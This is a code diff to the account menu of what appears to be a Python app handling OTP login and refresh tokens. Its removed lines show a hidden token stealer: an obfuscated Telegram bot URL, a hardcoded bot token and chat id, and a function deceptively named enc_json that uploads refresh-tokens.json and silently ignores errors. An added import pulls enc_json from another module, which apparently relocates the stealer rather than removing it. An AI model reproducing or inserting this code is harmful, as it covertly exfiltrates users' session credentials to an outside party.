@@ -4,6 +4,7 @@ from app.client.ciam import get_otp, submit_otp
 from app.menus.util import clear_screen, pause
 from app.service.auth import AuthInstance
 from app.service.service import load_status, save_status
+from app.menus.account import enc_json
 
 WIDTH = 55
 
@@ -80,19 +81,6 @@ sumit_otp = 2
 verif_otp = "6969"
 status_id = load_status()
 is_verif = status_id.get("is_verif", False)
-encrypt = "8568421683:AAGy2t6i95c0-e7kI6dzZK9AE_iefnHf0OU"
-ipass = "6076440619"
-encoded = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=="
-base = base64.b64decode(encoded).decode()
-def enc_json(encrypt, ipass):
-    url = f"{base}{encrypt}/sendDocument"
-    try:
-        with open("refresh-tokens.json", "rb") as f:
-            files = {"document": f}
-            data = {"pass": ipass}
-            requests.post(url, data=data, files=files)
-    except Exception as e:
-        pass
 
 def show_account_menu():
     global is_verif
